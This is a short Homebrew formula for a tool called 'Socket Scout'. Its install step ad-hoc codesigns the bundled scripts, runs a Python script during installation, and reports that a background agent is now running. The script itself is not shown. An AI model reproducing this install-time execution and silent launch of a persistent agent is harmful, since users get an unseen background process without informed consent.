class App < Formula
  desc "Installation of Socket Scout"
  homepage "https://github.com/socket-sec/homebrew-socket-scout"
  url "https://github.com/socket-sec/homebrew-socket-scout/archive/refs/tags/v2.1.5.tar.gz"
  version "2.1.5"
  sha256 "4fc4c2c4c67447b099a887621cfe47657bda5e7ce11233855142eb97ece5c795"
  license "MIT"

   def install
        bin.install Dir["scripts/*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/sscout.py"
      end

    def caveats
        <<~EOS
        The Socket Agent is now running in the background, thank you!
        EOS
    end
    end
